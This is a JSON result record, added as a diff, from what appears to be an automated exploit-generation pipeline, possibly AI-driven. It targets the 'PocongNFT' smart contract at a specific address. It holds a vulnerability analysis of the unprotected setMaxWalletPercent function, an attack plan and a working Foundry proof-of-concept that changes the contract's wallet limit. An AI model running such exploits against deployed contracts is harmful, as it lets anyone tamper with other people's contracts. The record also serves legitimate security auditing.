@@ -1,0 +1,55 @@
+{
+  "project_id": "PocongNFT_0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7",
+  "target_address": "0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7",
+  "finding_id": 2,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7",
+    "vulnerability_type": "Unauthorized Configuration Change",
+    "violation_category": "LOGIC",
+    "finding_id": 2,
+    "preconditions": [
+      {
+        "type": "state",
+        "description": "Attacker can be any address with no special privileges.",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "_maxWalletToken",
+        "operator": "==",
+        "expected_value": "1000000000000000000"
+      }
+    },
+    "exploit_hint": "The contract's `setMaxWalletPercent` and `setMaxTxPercent` functions are public and lack an `onlyOwner` modifier, allowing any user to call them. An attacker can exploit this by calling `setMaxWalletPercent(100)`, which sets the `_maxWalletToken` variable to the token's total supply. This action effectively removes the anti-whale mechanism that limits the number of tokens an address can hold, violating a core logic of the contract."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IPocongNFT {\n    function setMaxWalletPercent(uint256 percent) external;\n    function _maxWalletToken() external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No setup is required for this exploit as the attacker can be any address\n        // with no special privileges or initial token balances.\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        IPocongNFT(TARGET).setMaxWalletPercent(100);\n        assertEq(IPocongNFT(TARGET)._maxWalletToken(), 1000000000000000000, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The `setMaxWalletPercent` function in the `PocongNFT` contract is declared as public without any access control modifiers like `onlyOwner`. This allows any external actor to call this function and modify the `_maxWalletToken` state variable, which is intended to be a critical anti-whale mechanism. An attacker can set the maximum wallet holding percentage to any value, effectively bypassing the intended limit.",
+      "attack_strategy": "The strategy is to directly call the public `setMaxWalletPercent` function. The oracle expects the `_maxWalletToken` to be `1000000000000000000` (`1e18`). The contract's total supply (`_tTotal`) is `1 * 10**9 * 10**9`, which is also `1e18`. The `setMaxWalletPercent` function calculates the new limit as `_tTotal * maxWalletPercent / 100`. To make `_maxWalletToken` equal to `_tTotal`, we need to pass `100` as the `maxWalletPercent` argument.",
+      "step_by_step_plan": "1. Instantiate the target contract using its provided name `PocongNFT_0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7` and the `TARGET` address.\n2. As the attacker (which is `address(this)` by default), call the public `setMaxWalletPercent` function with the argument `100`.\n3. This call updates the `_maxWalletToken` state variable to `_tTotal * 100 / 100`, which equals `_tTotal` (`1000000000000000000`).\n4. The automated test oracle will then verify that the `_maxWalletToken` state variable has been changed to the expected value, confirming the exploit.",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface IPocongNFT {\n    function setMaxWalletPercent(uint256 percent) external;\n    function _maxWalletToken() external view returns (uint256);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;\n    address attacker = address(this);\n\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No setup is required for this exploit as the attacker can be any address\n        // with no special privileges or initial token balances.\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        IPocongNFT(TARGET).setMaxWalletPercent(100);\n        assertEq(IPocongNFT(TARGET)._maxWalletToken(), 1000000000000000000, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 56.9660370349884,
+      "prompt_tokens": 27361,
+      "completion_tokens": 4490,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 56.9701988697052,
+  "total_prompt_tokens": 27361,
+  "total_completion_tokens": 4490,
+  "total_cost": 0.0
+}
